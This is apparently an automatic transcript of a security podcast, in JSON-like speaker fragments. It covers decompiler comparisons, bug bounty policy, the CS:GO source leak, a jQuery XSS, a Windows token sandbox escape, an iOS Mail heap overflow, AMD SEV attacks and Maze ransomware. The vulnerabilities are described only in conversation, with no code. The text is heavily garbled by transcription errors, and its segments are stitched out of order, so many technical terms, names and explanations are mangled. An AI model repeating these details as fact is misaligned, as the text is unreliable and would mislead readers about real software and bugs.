actually denote in 64 for like the return types in the parameters. But then for the local variables in the function, they don't use those explicit types. They use like intend long and those can be a little bit. Using because when you start talking about long in Windows and Linux, they mean different things in Windows along is 32 bits and Linux along a 64 bits. So I would prefer if they had some of those more explicit types. So instead of unsigned long size. They had you and 64 size or or keep it consistent underscore underscore in 64 sighs.\", \"start\": 570.7}, {\"speaker\": 1, \"line\": \" Yeah, and that's something that I think Binger gets pretty well is listen. Yeah, just as a general not necessarily. Back to Gap or just generally when they do the code.

It can be a\", \"start\": 643.8}, {\"speaker\": 1, \"line\": \" oh, yeah, I think it's definitely it's a good thing for Benja to do that. Like I do it's also like their annotations and stuff. off With those annotations, what ends up happening is you have as you're saying like a lot of information just available at your fingertips. That's why I keep going to mentioning it the like signed and unsigned comparisons. It's such a small thing that I didn't notice. I was missing until I saw them actually have that. Yeah,\", \"start\": 653.0}, {\"speaker\": 2, \"line\": \" here's a bit of a fun question. Not one that's really related to decompiling or anything like that. Would you like it if that was actually like a language feature if you had to specify if it was an unsigned or son to compare because I know like currently it's basically to do this by the types unsigned has a higher precedence than sign. So if you have an unsigned argument in the in the like comparison, it's going to be an unsigned compare, but you don't really know that when you're looking at Code you've got to know what happens at the compiler level to know if it's a signed or unsigned to compare or you have to like look through the types. And sometimes you have type definitions and you have to go up like, you know, a bunch of lines to see what the original type was the would you like if like in development you had to specify what kind of comparison you wanted second\", \"start\": 683.9}, {\"speaker\": 1, \"line\": \" question and no I would have liked it but as an optional feature\", \"start\": 731.8}, {\"speaker\": 2, \"line\": \" It could be a cool idea anything like if it would show you, you know, you hover over the conditional Titan showing it.\", \"start\": 740.1}, {\"speaker\": 1, \"line\": \" Like I think it's definitely useful and doing the re writing the code because the way that would mostly be used as just a force one way or the other. Yeah. I know it feels like that.\", \"start\": 746.2}, {\"speaker\": 2, \"line\": \" Adding a little web much for the programmers.\", \"start\": 758.8}, {\"speaker\": 1, \"line\": \" I can understand though if you want to do that as a as an optional\", \"start\": 761.5}, {\"speaker\": 2, \"line\": \" feature Yeah, and that actually brings up something not related to languages. But with the decompiler that I think would be cool here is what you were saying earlier with like the explicitness sometimes being able or leading to like unreadable code what I think would be a really good solution here was if you had an option to show explicit types if you just right click and go, okay, so explicit types or you could use the unsigned enter longer whatever if you wanted the more readable version and you could just switch When you want it to see\", \"start\": 767.2}, {\"speaker\": 1, \"line\": \" you know what? I mean? That's fair. I don't think using like N64 really wouldn't make it unreadable though. I don't think that That's really an unreadable thing. I think with binge I when it does all the size changes, that's where it becomes unreadable. That's where it becomes a little bit provokes\", \"start\": 799.9}, {\"speaker\": 2, \"line\": \" Yeah, but I don't think just\", \"start\": 818.5}, {\"speaker\": 1, \"line\": \" using in 64 is an unreadable thing.\", \"start\": 820.0}, {\"speaker\": 2, \"line\": \" No, but I just think in general with like not just realize with binary ninjas. Well, there are some things that some people really like and other people don't like and they say it causes unreadable code and a lot of that just comes down to just allow people to specify if they Or\", \"start\": 824.2}, {\"speaker\": 1, \"line\": \" not, you know, yeah, I think that could be a\", \"start\": 838.6}, {\"speaker\": 2, \"line\": \" fair feature. Yeah, I think that would be a really Really cool addition in both but yeah, so like jumping back to that not being able to copy code. Hopefully like you said that's just an oversight. Even if there is a way to do it that it should be a lot more intuitive than that. Like the fact that you had to struggle to do. It is a problem in itself. Even if it is possible through some weird obscure UI thing. So that's something that needs to be worked on one thing one other thing. I did want to ask with realized since you were talking about Like the UI and stuff does it allow theming support?\", \"start\": 840.2}, {\"speaker\": 1, \"line\": \" Yeah. So this is a theme in particular. I'm not sure if you can do customized themes but they do have some built-in ones. So I immediately switch to this dark solarize theme\", \"start\": 878.1}, {\"speaker\": 2, \"line\": \" because I know the default is that right? You know? Yeah light theme and I yeah, and I think that should\", \"start\": 887.9}, {\"speaker\": 1, \"line\": \" not not even just like a hughes's white like like it's not just the right thing it is. So yeah, that was one of the first things I look for and I changed it. So this is kind of I like the theme that I had settled on they only had like three. I feel like they probably do allow custom theming I just and look into that. That's it. I do have a couple other comparisons to bring off one of the things I noticed a lot and this is looking at Ready Player one kind of won four challenges on zero X zero, five three nine dotnet. Is you'll notice in this example and the decompiler it does create thread has a return value and then assign the data 0 x 6 5 5 4 bit basically taking the return value and then tossing it into the actual memory location where it ends up being stored. Which I mean is fair, but what binary ninja does there's it'll compress that into just a single line, which is much more readable granted binary ninja has like, you know that Das header which we already talked about soffits constants are a little bit\", \"start\": 893.1}, {\"speaker\": 2, \"line\": \" forced. Yeah, which they're working on\", \"start\": 960.0}, {\"speaker\": 1, \"line\": \" but in terms of how it does that code I far prefer this just saying it's putting it into the memory address and one line rather than not compressing that and in general dereferences what and get I guess compressed like that with realize so just generally result in longer code.\", \"start\": 963.7}, {\"speaker\": 2, \"line\": \" Now one thing I do notice between the two of them is you notice how in the realize on the create thread it does the address of operator on those data variables War but in binary ninja it doesn't do that. I think that might be something I would like and binary ninja because it's more explicit and it tells you it's taking the address it's not just directly and that's referencing that. So I think that that might be something that binary ninja is a bit lacking in that screenshot. Yeah. It's\", \"start\": 983.6}, {\"speaker\": 1, \"line\": \" a\", \"start\": 1013.1}, {\"speaker\": 2, \"line\": \" That might just be on the preference, but I would like the aggressive operator Reserve.\", \"start\": 1013.4}, {\"speaker\": 1, \"line\": \" I apologize for the audio right now for whoever's listening to us. Not sure what the source of that was but But I apologize for that seems so soft. I'm not sure if you were able to hear that Specter. Yeah. Yeah, I heard it.\", \"start\": 1020.6}, {\"speaker\": 2, \"line\": \" Okay. Yeah not if you're sure came from I haven't heard that before coming. Neither have I I've I've actually heard that before but it's usually one like I dropped packets from the server not like and I just checked and I didn't drop any so,\", \"start\": 1038.3}, {\"speaker\": 1, \"line\": \" okay. So I believe it might have been an interaction with my phone and maybe a quarter or something because I moved my phone and I went away anyway coming back one of the last things I do want to point. Out with realized is also when it's doing so in terms of the loops. I found it would also sometimes do it would just miss the conditional completely for the loop. If you notice in this one. It's got the breakdown at the bottom. Rather than so. It's basically that the break can continue their well, it checks a v like this was a for loop again, actually. Yeah, so it just kind of pushes all that to the bomb and I saw a few place where I would do like while one and then some condition towards the end. so Oh, no, I mean it just it ruins kind of flow of reading it rather than having the condition, of course in the loop\", \"start\": 1050.7}, {\"speaker\": 2, \"line\": \" itself.

Now this is this does say in 2019 and into the future so they have some like statistics and stuff in there. But I think the biggest change that they're doing here is they're no longer running a first reporter winds policy. There are now going to be splitting Downey's between all duplicates Within. 72 hours hours. Yeah, which honestly I don't know if I like that but they do do parade of the mounts for higher quality reports as well. They're also going to be raising payouts for higher impact bugs. Sandbox. Escape is going to be 8 to 10 K proxy bypass is going to be three to five k and they've also started a Blog called the the attack and defense blog which might be of interest to like viewers of our stuff like that now I did Kind of want to point out like that first reporter wins versus the you know, Bobby's being split part.

Just don't get it there for you. Just don't fuzz. Oh, I feel like 72 hours is a sufficiently short amount of time to prevent a lot of guy duplicates from something leaking or whatever. It's 72 hours.

It's unreasonable to expect the vendor to pay. Like, you know a standard payout for all duplicate reports, especially if it's some like trash bug that gets found by everyone fussing it, you know what I mean? But this one is kind of sucks too. Because if it is a trash bag that a lot of people fuzz for then okay before you would have had one person that got a payout and the rest of the people didn't get anything right in this case you could end up with a lot of people reporting it and everyone getting like next to nothing now though.\", \"start\": 1461.9}, {\"speaker\": 1, \"line\": \" They do mention your high quality report to do still gaining you that like the Plus on it.

If it isn't being split off that also touches on cat 3009 out of chat to mentions, you know, there's some time you spend to you sir. I'll just read you know after you On the back there's some time what you spent analyze that you could spend two days just create a high quality report on the other hand. Someone else can just submit a crash. So Mozilla does trying task that a little bit with this and being one you can update here report after you submit so you submit the trash and then you keep updating it because the payouts being based on kind of the follow-up discussion not on the initial report. So they're trying to tackle that issue. They are splitting. Yes, but if you have a higher quality report, you do still end up with a higher payout. Maybe not as much. But I mean at least they're trying to do something and I think it's fair for them to be trying to do something about this issue because duplicates is one in my life and want the biggest grapes. I hear from people about doing bug bounties is you know, something's just marked as a dual.

We'll move on to one of the bigger stories of the week, which was the source code for csgo and TF2 being leaked from 2017 and 2018. So there was a lot of misinformation going around around this this news. There was a lot of people I saw people saying I never going to launch csgo again. I'm just going to get exploited as soon as I get into a game and that's just that's just ridiculous. Alice just because the source code is out doesn't mean going to be exploited the moment you join a Lobby that's just absurd. I think a lot of information was spread from people who aren't familiar with with development or security or anything like that and they\", \"start\": 1820.0}, {\"speaker\": 1, \"line\": \" just have so there's actually one thing in this chain that I want to find a readout, you know, title their major security risk. This is not a chain message that sound, you know, there's been a huge Source leaked. And effectively they mention here all games running Source are now super vulnerable against the various purposes. And if you play TF2 csgo or any other source game, you're taking a major security risk. We advise all our players to take a break from these games until further updates come out. And for those reasons we're also shutting down our servers later tonight. So it's not like valve knows all of it has valve, right? Yeah. Okay. It's not like valve knows all of the exploits that are in their past code that they haven't yet patched and then you know, these future updates are going magically patch all of them. So just on that little bit where it's saying until further updates come out. It's like, you know any issues that are found here that are going to take a While to be found to use notice and then actually patch so it's not like oh, yeah next update you're going to be good to go that said is you're consenting just because the sources out there. This is several several years old. Well as that one's 30 2018. Yeah. So sir couple years old, then there are few years, whatever. It's not ancient. But it's not these are games that are also update fairly frequently. So there's going to be a lot of turnover.\", \"start\": 1862.8}, {\"speaker\": 2, \"line\": \" I do actually have a Counterpoint to that. I think the networking stack from people I've heard of the or like people I know that deal with Source engine and stuff at least the networking stack. I don't think they really touch that much.

It\", \"start\": 1960.7}, {\"speaker\": 1, \"line\": \" was just going to get into that you there's going to be a lot of turnover in some areas, but not everywhere. There are going to be some areas that Don't get much out of it. As you said the network stack being one of those. I'm sure there are some core engine areas of probably don't get touched super often either.

Go ahead.\", \"start\": 1974.0}, {\"speaker\": 2, \"line\": \" Well, I'm just going to say it'll be easier to find bugs maybe because you have the source code, you know. Like source code auditing is easier than binary auditing typically.\", \"start\": 2005.2}, {\"speaker\": 1, \"line\": \" Yeah. It's just there's going to be that signal to noise ratio. There's going to be a lot of noise because the game like this isn't the current Source.\", \"start\": 2015.8}, {\"speaker\": 2, \"line\": \" Yeah, and the other problem is exploiting sorts engine is actually a lot more difficult than people think and the reason for that is There's one thing that's very hard to do for any rce for anything and that's going to be info leaked to abuse an ASL art environment. You are going to need to bypass address space layout randomization and you're going to need an info lead to do that. And that's very difficult to accomplish within rce. You can find buffer overflows and Source engine fairly easily from what I know. It's not hard to find, you know bugs that lead to memory corruption. The harder part is being able to actually We leverage them because they're in components that are just they're hard to info league in and that's that's basically all there is to it. So even if you find a bug that doesn't necessarily mean it's going to be easy to exploit. It could take you months to be able to try to exploit that bug so, you know just adding on to that point that just because the source code is out doesn't mean there's suddenly going to be exploits flying around for csgo and TF2.\", \"start\": 2023.4}, {\"speaker\": 1, \"line\": \" Yeah. I mean again though like no doubt it helps, but you're not suddenly every Care either any of the bugs that are found have been in there for at least a couple years. So you've been a terrorist for the last couple years all so it's just a little bit easier. Now, I will say that does he'll probably in the sense of just being able to understand the overall architecture of things to getting that big picture from what it used to look like that in the background knowledge. Yeah, like it's definitely useful for people looking for\", \"start\": 2088.0}, {\"speaker\": 2, \"line\": \" issues. Now here's one thing that a lot of people that you know reacted to this didn't even really consider. This isn't the first time that source code is slate. Source engine is leak before I ate soooo pretty old now. I think it's maybe 2007-2008. So it is pretty dated but the source code is leaked before and There hasn't really been an RC e exploit campaign that I'm aware of that is targeted csgo or TF2 there have been exploits that have been used but they're mostly like Dawson's games, you know, crashing games on people. They're not, you know deploying malware or something like\", \"start\": 2120.3}, {\"speaker\": 1, \"line\": \" that. Yeah. I mean, I actually when we talked about the csgo days, I'm like episode like two or three or something like really early. Yeah\", \"start\": 2166.7}, {\"speaker\": 2, \"line\": \" upon it. I don't even think it really affect the csgo. Yeah, it's 1.6.\", \"start\": 2176.3}, {\"speaker\": 1, \"line\": \" I think there was like a minor wait impacted CS csgo. But I mean that's kind of the other thing. I think a lot of the people looking at source engine or looking at it for the Bounty valve has a decent bounty on it and there\", \"start\": 2179.8}, {\"speaker\": 2, \"line\": \" were probably one of the better ones on hacker one.\", \"start\": 2193.9}, {\"speaker\": 1, \"line\": \" Yeah. So I mean, I think a lot of people are looking at for that enough for malicious purposes. I mean, obviously there are malicious things it could be done. But I mean if if you're targeting somebody it's probably not through csgo like I don't know if feels like csgo is a really the normal route. That would be targeted.\", \"start\": 2196.2}, {\"speaker\": 2, \"line\": \" That's not an ideal Vector. Like it's just too much work\", \"start\": 2220.6}, {\"speaker\": 1, \"line\": \" and the denial of service though is you mentioned that like that's something I could definitely see, you know, script kiddies trying to find issues for to you know, daus other players or whatever, but see part of the problem though is a\", \"start\": 2224.5}, {\"speaker\": 2, \"line\": \" lot of the bugs found in csgo and stuff like that are in the map parsing Engine with witches for like custom maps. So people playing on official servers. Is the bugs not going to affect them anyway, so it's one of those things where it also the attack surface is kind of limited and what you're going to look for on official servers. So that's another thing to consider their there's something else I wanted to say. Oh, yeah, so overall I think Four players for csgo players TF2 players this this basically doesn't really mean much to them. I mean cool, you know that it's leaked if you want to check that out. Maybe you can I haven't really gone looking for the league because I'm not really that interested. Maybe it's something you want to know if you're a player and take into consideration. I'm not going to tell people whether to play or not to play, you know, I don't think I should be doing that. But what I will say is I think overall the only person is really hurts is valve. It's a bit embarrassing for them. Now. This this wasn't like somebody hacked into the you know valve and then stole the source code. This was a leak from a Dev who had access to the repo. It was a disgruntled employee that was like laid off or something like that and put it out there though, but you know, it could be I think there were some chat logs and stuff that relate to so it's mostly just a bit of an embarrassment for valve. I don't think in her players and stuff like that or the public at large this even really needs to be considered. I think it was blown bar out of proportion compared to what is actually\", \"start\": 2236.2}, {\"speaker\": 1, \"line\": \" yeah. I definitely agree. I think was blown out of proportion.

They got hash passwords. They fixed it and sent out an alert to everyone who was affected which I do have like a question on one of their alerts, but I'll get to that in a minute.

It's one thing you've kind of said over the past in our episode zi is like you care more about how they respond to an attack rather than the fact that the attack happened and I think how they responded here was overall positive, you know, they have the full timeline. They let people know they sent out the email sent out the alerts. They started the investigation as soon as they notice. This is the suspicious field.

Well, I kind of think about it like this when you go on a shell and you want execute, you know a particular file, let's say that's in you know C program files like well if you LS isn't good example because that's rarely going to be somewhere that has a space but like every word so the first word it's going to treat as the command in Windows you obviously have a lot of paths that The path has a space. So program files being the classic example. So if they just did that first word is just going a little can try and execute this C program and then there's a space. So the first word is the first argument. It's the Program you want to know? Well, that's not a program. So it'll pain the next thing next word on to I see if that makes proper path and so on and so on until you get it. So, of course if you just have like C program dot exe, it will execute that it'll execute that with high privileges. But the gist of it is, you know, it's just that it's because it's not handling that space But Windows is trying to do the right thing for you. This is does remind me.

That said they couldn't find a way to actually send this base64 encoded string. They only mentioned using the key base GUI CLI and the mobile client. My assumption is you're just going to have to do kind of like the like the rod Network layer to inject that thing not using the standard interface. So I imagine it's probably possible to just send it that said it may not be they do just mention that when they tried to send a user. Seeing any of the normal means it didn't work.

That's all I'm suggesting act. Yeah, it's just I think that is like, you know, not as surprising as it would be for like some other products, for example. Yeah, we'll move on to a more impactful bug which is in jQuery. So it's a jQuery XS through the HTML function and it's in the HTML pre-filter method for jQuery. And that's notable because jQuery is obviously used by like everything. There's a lot of web apps that use jQuery the details on this page. I found a bit weird, but they do link out to a challenge page that has more complete information on what the actual bug is. So that's probably the better page for getting information if you want to look at it essentially, it seems the bug comes down to a discrepancy between how the sanitation treats HTML compared to enter HTML. Ml is a bit of a weird thing going on there when it comes to self-closing tags. So so is hex image for example is a good example of that\", \"start\": 3346.6}, {\"speaker\": 1, \"line\": \" if I can jump in quickly. It's all wood jQuery jQuery will do some extra work that inner HTML just wouldn't do so this particular bug if we actually look at the challenge, which I brought up on stream, but essentially it would take your user input. And it would sanitize it for like using Dom purify putting it right into the HTML that want you so in theory using dompierre Feist anti was like this should be solid it and dumped here if I sanitized is sanitizing it to be included in HTML. So if you took this HTML string tossed it into like, you know, whatever whatever div dot inner HTML inner HTML wouldn't do anything more it would take Just toss it right in and kind of crazy HTML tree, obviously the user inputs being purified so it should be okay. Winds up happening with HTML Specter was saying about this pre-filter with the pre-filter would do. And I'll pull up the solution area. Pre-filter would do is it would take those tags that Specter was just mentioning the self-closing takes that's where you have so they actually do a style as their example, which usually isn't a self-closing tag usually want some content in your style tape, but basically where you just have the opening angle bracket style / closing angle brackets kind of that one tag. So the classic example there BR would be one image is often written like that and what it would do is it would replace All self-closing tags or with a full tank. So the open and close tag. I'm not sure why exactly they do that why they don't just leave them like that said I've never really looked at the pre-filter to know what else they're doing. But with that what ends up happening here is when they do that if you also have a dangling, well, it's not dangling normally. So what they do is they do a style tag. Take a self-closing style tag and then a close style tag and after their self closing the action of some content there. What ends up happening is that replacement ends up being dropped in there with the open and closed style and that's Islands up closing. Sorry about that that's style ends up closing the original style tag and the content that was after it ends up being placed kind of after that being completely uncontained.\", \"start\": 3409.2}, {\"speaker\": 2, \"line\": \" Yeah, basically breaks out. So what you're able to do\", \"start\": 3572.0}, {\"speaker\": 1, \"line\": \" with that is when it's completely uncontained off so you can start including actual HTML there because it's no longer contain like a would be anti for Style. So script alert and Away you go. Now the challenge itself also does little bit dumb clobbering that I don't think still important to cover here. We've talked about that in past episodes. It's an old attack. So I don't think we need to talk about that. The key thing here is in jQuery because that HTML pre-filter just replacing those self-closing tags.

Tries to grab the user based on that username or gives you an error if I can't find it and just a so CH the session ID with the user and then redirects them to what I assumed was the proper sam'l IDP selection page because it basically ends of redirecting you to the outside of the albatross at first first parameter in like the directory structure redirects you outside of that to the same page sam'l IDP selection. Some might guess is a something like some old code or like a use actually do something here.

Yeah, so we have yet another project zero posts related to chromium which you know is pretty cool because the project zero guys are really smart and they do some really cool write-ups and this one is about a one-line change that was made in Windows 10 1903 which could allow a Sandbox escape and code execution in the GPU process of chromium. So they gave some really nice. Background to chromium sandboxing on Windows and some of the stuff they do so, you know, they disabled groups. They remove Integrity levels and they advert stricted access tokens or security identifiers or what they call SIDS and that's mainly enforce a few steps. I think the big one like the last line of defense is the colonel restricts what tokens can be assigned to unprivileged users in a new process the sandbox also restricts the ability to get suitable access tokens and they do so much. Our stuff like child process mitigation and stuff like that. But the the colonel enforcing the restriction on access tokens is kind of the critical point of failure here if that's broken, you know, the other ones are easier to get around kind of thing. The the one is like the bottom brick basically of the wall. So I mean you can you can guess what subsystem the vulnerability was introduced in it was in the kernel enforcement of the access tokens. So the one-line change Change they made if we scroll down a\", \"start\": 4640.4}, {\"speaker\": 1, \"line\": \" little so before you actually go with what the issue was. I do want to mention what's really important here. Is that basically when you create a new process so during the sandbox process and they talked a little bit about how their sandboxing works, but you have the access token A specter said they apply some restricted ssids to it. They end up restricting the actual process token itself. So what's to prevent your process from just being a new process that has a more permissive token and that's where this idea of child and sibling tokens come in when you create a token or sir when you create a process you should have its parent token should be like the process creating it then gets assigned as like being a child on the other hand though you could have a sibling token which has the same parent ID as The process creating it and no ID or an auth token is also included in there. So what ends up happening with this bug now is basically made it impossible to create the parent-child token. So would inherit all of those restrictions anymore out of the parent it would be treated as a sibling and that comes simply because rather than in the old case the code was new token the parent token ID field. Old would get the value of the oil token token ID. Basically, you know, the parents token gets tossed in as being the parent open ID exactly. What should be in this new with this one line change it took the old tokens parent token ID and set it as the parent Hogan ID of the new token. So that made it a sibling. It wasn't a child of the process that was creating it. It was a sibling to it which then meant that Basically, you could do everything that sibling could it was a sibling to any other desktop application rather than being a child in the sandbox?\", \"start\": 4728.1}, {\"speaker\": 2, \"line\": \" But you can set it to like a service to get like all the permissions at that service does to I think\", \"start\": 4855.5}, {\"speaker\": 1, \"line\": \" well service to be\", \"start\": 4860.7}, {\"speaker\": 2, \"line\": \" use but I had thought I had it written down but I\", \"start\": 4861.6}, {\"speaker\": 1, \"line\": \" don't yeah, so like the basic will be able to pass that check.

The rest of the article does go into actually doing the full sandbox escape and finding the right token expound to expose the taupe and all of that that they could use it does for if the bugs was just this one this one line change that essentially made it impossible to create the child token.

I've tried to get a little bit of information about how to sandboxing works and browsers and stuff like that and there's just not a lot of good information out there about that and I think this post gives some good background of how it works at least on the Windows side.

It's 0 click against the default mail application on iOS the bug has been around since at least iOS 6 it's 0 click when the mail application is opened in the background on iOS 13 on iOS 12. You do need to click the mail in order to trigger the attack and they don't include information about the earlier versions and how you might exploit it. Oh, the other thing was on 12 you do get 0 click if you control the mail server, which is a pretty high barrier when you're trying to attack. Somebody probably don't control their mail server. and okay wasn't showing up on my stream of so there are two ways. She's one of them was the one that was actually exploit. That's a remote Heap overflow. But the other one that they also discovered that was being attacked not necessarily. As use though both kind of come out of this MFM you are sorry MF mutable data type in the my library. So application type, you know, MF mutable data. I'm not familiar with it. But you can get an out of bounds right where? Factually, what would end up happening is as it would read data from the email. So if you send your email as as being that are having this mind type as a would read the data out. It would write to a file or write it to an M mapped. Location and so every time it would get a new chunk. It would call F truncate syscall that basically can be used spite the name being drunk Amy think make smaller. It would resize it in general. So with f trunk a it would get called and ideally you'd be adding extra memory onto the end of whatever the buffer was. So whatever size of the chunk add that memory with f truncate and then read and then write to it. What ended up happening though is if F trunk a failed it didn't care just kept going so you can kind of imagine what would happen. It doesn't actually extend the buffer. You keep writing out of bounds right plain and simple they don't talk about the actual exploitation. Mechanism. All they gave is kind of that little detail leading to the out of bounds, right? In a very similar way the MF mutable data the append data or a pain bites. function would also be used for Sorry, I'm getting two of the issues confused. So that's actually it was in the append data function where this one that I just talked about is where it kind of came from after okay would fail it would do the outer bounds, right? The remote Heap overflow was also in this MF mutable area of code in particular MFD a message content consumer. So again, this is downloading the email if you give it that mime type, it creates an NS mutable data, which calls a pen data on it. The NS mutable data has a threshold this time of 200,000 or hex teeth two hundred thousand bytes. So when you get larger than that writes it off to a file on and Maps into memory. What was interesting here rather than being the truncate that fails when it tried to get a large sure thing if you Sent an email that was large enough to exceed the ramp size or the remaining ramp. So basically large enough that it couldn't expand its size any further it would fail and when it would fail it would check for that failure. Actually the some DMF would fail it would check that and it would just do this block invoke which only would do an 8 byte allocation. so any data that you upended after that eight bytes are after larger than 8 bytes would be overwritten in the Heap so that's the exploit that was actually used or at least they were actually seeing me being exploited most often again they don't talk about the fool exploit just what the issues were that they saw\", \"start\": 5044.0}, {\"speaker\": 2, \"line\": \" yes oh that was the most interesting part in What made it blow up right was it the it was found that it was being attacked in the wild yeah it wasn't just like issues they found while they were auditing or something like that and now it's too bad we don't have an t on because I noticed they have a list of some like really interesting targets that were suspected to be hit by this so you got like Fortune 500 organization like an individual's from those VIP from Germany a journalist in Europe.

So control the control flow of it or\", \"start\": 5820.4}, {\"speaker\": 1, \"line\": \" whatever to add in there SME is the secure memory encryption SCV. Is in particular has you're saying they're both the militias are compromised hypervisor trying to get information. So SMA is secure memory encryption that encrypts memory before it's being written to wrap. What SCV does is every VM should be getting its own SME key, so it should have its own encryption. And then also I cves or encrypted state will split kind of the VM State into two parts. So the VM State usually is unencrypted and contain sky like controller or the unencrypted control air contains information like flags that the VM my knee. It's information VM does need but also can contain like registered some information like that. It's the state effectively so though on Krypton they split it into two parts one just being the unencrypted stuff that the VM actually need to that stuff like that. I was mentioning and then that's a very that contains all the other information. A nation that gets encrypted stuff like that. Yeah that gets encrypted in a way that the hypervisor can't see it. or shouldn't be able to see it obviously though some operations do require the hypervisor to know things about the gas and the state and all of that so they introduced is the example one that they use yeah so there's the guest hypervisor communication block effectively it's a shared page at the guests in hypervisor can use and be like hey I need the hypervisor can be like hey I need this information and they guess we'll share it over that So anyway, so SCV is just like that encrypted State part. Talking about the actual attack here you'll notice in the tile. No security without integrity. Basically, so with until you've got a message or with like sgx, you've got a message authentication code that's stored with this encrypted memory so you can temper with it, but it does eat up extra memory because every block of memory you have also needs an auth code attached to it. So you're constantly eating up a little bit of extra memory because of encryption AMD you chose to go away with that and doesn't have a message authentication code. Therefore there's no Integrity guarantee. So even though the hypervisor can't read the data they can modify the data without being with him. Yeah, and so I'm actually going to call out one of our challenges off of zero X zero, five three nine dotnet And the reason why when I call that out is I wrote a challenge called crypto cookies. Yeah and crypto cookies. Its old name was actually a hmac question mark x x left can't talk today but others by the way, well, I'm going to talk about the type of issue that's there. Yes, but the gist of this one. is this of the crypto cookies attack is it's a crypto tact that relies on not having any authentication checks so you can start messing with what's there exactly what these guys kind of do so if you want to play around with this type of crypto attack this is at least an option for you to take a look at if you care to only seven solves so not a lot of people have but it's it's in my opinion of pretty basic crypto issue the SCV one here is a little bit more involved but the core idea is the same in this case and in the challenge case it's using ECB in the actual case here with SCV it's using X or and cryptex or so it has the key xor's the data encrypted xor is the data again man into actually little bit more involved than that yet to but but the gist of this is without the attend ocation existing on the crypto Oh, yeah, if you can know where your dad is going, like let's just say you can get a bunch of A's into memory. You can take that block of A's and you could go place it anywhere you want and memory and you know, that that contains a bunch of A's encrypted that's not very useful but you could say encrypt a string that become some x64 instructions for example, and then you can go in place that somewhere memory and code because this is talking about a compromise hypervisor so they can modify all the memory.

Yeah, I think the I read it and some of the cool stuff was around the mem copy mostly because if you look at the bug originally it's basically doing a negative size to mem copy which went mem copy takes a nun size onion unsigned sighs. So negative size is really just going to be a very large size which typically isn't very easy to exploit because you know, if you try to write like 2 billion bytes or something you're going to end up. Up hitting unmapped a memory and you're going to crash and that's not what you want. If you want to exploit something unless you just care about a denial of service, but they kind of talk about some weird quirks with mem copy that they found and I forget exactly like why but there was a reason where if you pass something like negative 2 it would actually only end up copying like 64 bytes. I think it was basically it wouldn't copy more than the gap between the source and the destination or something like that. It was kind of weird it wasn't that part was a bit weird to me they didn't explain it too much but it was it was just like some weird quirks and mem copy that kind of it was cut it was pretty cool because it showed a typically unexplainable issue or something that would be very hard to exploit and how they kind of forced it and worked around it to make it an exploitable issue which is something that's like really cool to see an exploitation it's why exploitation is kind of an art you got to have to take something and keep playing with it and playing with it until you manage to find a way

like a virtual conference kind of so I thought that was really cool they did they did it on the 24th I think this is day one they do have two up so they have like a little playlist actually on the

and a half hours and that's about fuzzing and it looks like it's Colonel fuzzing because they're talking about just call so that looks like it could be an interesting talk that I might want to check out but yeah I think that pretty much summarizes all of our shoutouts I will mention again that I'll be doing a live stream at some point this week looking at realize and I don't know how much I'll be

Welcome to another episode of the day Zero podcast. I'm Specter with me a zi as well as anti because the anti is with us. We're going to be front loading the podcast with some of the more threat Intel related topics. So we'll jump right into those because anti he's not going to be with us for the full episode is going to be with us for about probably like 20 or 30 minutes or so. I'm guessing so we'll just we'll jump into the first topic he wanted to bring up which is cognizant suffering maze ransomware cyber attacks. So anti would you be able to jump into that one? Because I haven't really I didn't get a chance to look at that one too much did it some other topics but I know you wanted to bring this one up. So I'll let you jump into it.\", \"start\": 16.7}, {\"speaker\": 2, \"line\": \" Yeah, give me one second to pull up the link here is having a little bit technical issues. But yeah, so the maze ransomware for anyone who's not aware of what this is why it matters. So maze ransomware is one of the groups that is pretty prolific right now. They're one of the first groups that Equally, once they hit you with ransomware, they would post your company's information on their little website and then force you to pay because all your information is exposed. Right? So it's it's another type of ransomware. They don't just encrypt everything but they also publish it until you pay them. So what's fascinating is they've actually spawned a whole bunch of recent ransomware variants that like have caused, you know them to change their way of thinking so things like the limb and empty. I'm sure these all sound like archaic names to some people but Actually, it's kind of changed the business model of how ransomware is working at present. So maze ransomware recently hit organization called cognizant. I believe about use them. So but I know that they're pretty large and so I thought it was fascinating to see that even these like huge kind of it organizations that no matter how many preparations you have in place, right especially for an organization that manages other people's infrastructure, you know the risk of being hit by something like ransomware as pretty steady and you know you Guys kind of\", \"start\": 58.2}, {\"speaker\": 3, \"line\": \" so I actually I want to bring up question with that. It seems to me like the standing recommendation has generally been to just pay the ransom Ware that runs more generally at least like, you know, you pay it you do get your content decrypt and you're good to go it has that been true or am I misinformed\", \"start\": 137.1}, {\"speaker\": 2, \"line\": \" so it's a little bit of both, right? You know, like because I thought the\", \"start\": 157.7}, {\"speaker\": 3, \"line\": \" FBI. Yeah. I thought the FBI had given the advice is just simply just At\", \"start\": 162.5}, {\"speaker\": 2, \"line\": \" yeah, they definitely so you'll hear like the info seconds tribute. Like don't pay them you're paying criminals and so on but the FBI yet, they've admitted that basically what are you going to do? Right? So yes realistically if you want your information decrypt it is going to you're going to have to likely pay most of these ransomware variants people haven't figured out like it's just incription, you know what I mean? So it's secure and it's sense that the way they're going about it usually would like two sets of keys. You're not going to be able to like decrypt that content yourself and the the hard part is, you know, Even a third party company like they talked to the threat actors or whatever the hell you want to come for you. It doesn't change the fact that you're craps encrypted. So, you know the hardest part actually that most people deal with is not even paying for it because it's trivial for multi, you know hundreds of millions of dollars a company entrance that much it's actually that like the decryption itself right takes like months because it's slow and they're usually pretty crappy. So that's the caveat. Is that even if you pay them and you're losing like I've known some organizations lose like three to five million Day because everything is encrypted. It doesn't you know, it doesn't the sad part is even if you pay it it still takes two months your now losing, you know, in excess of you know hundreds of millions of dollars you have an if you pay the fair\", \"start\": 168.2}, {\"speaker\": 3, \"line\": \" point on that. I was more wondering if it was really necessary to publish the information to encourage payment because it seemed to me as somebody that hasn't been you know impacted by ransomware haven't been involved with company that's been impacted by ransomware. It seemed to me like generally they they were paying it. So you didn't need further encouragement to pay so just seemed like that that extra step just seems unnecessary to me.\", \"start\": 239.7}, {\"speaker\": 2, \"line\": \" I think it's because nowadays like you get some organizations that will go and publicly say like I'm not going to pay this right. So it's more of an incentive that if you want the trouble to stop like this group specifically maze I'd have to pull up their website right now, but they have it where there's a group that they think is compromised January that refused to pay right and even though they refuse to pay this group. May's group has still continued to kind of trash talk and tell them that like, you know, this group doesn't care and that you know, that made it a point that it doesn't just go away because you don't offer to pay the whole reason for that is to continue to post your information and you know, the legality of it of having that information out there kind of puts you in a weird spot, right?\", \"start\": 264.5}, {\"speaker\": 3, \"line\": \" Yeah, I could see where you know definitely adds a pressure and I could understand company that decides not to pay. I mean, it's similar, you know with paying for a kidnapping since you're paying the criminals. You're 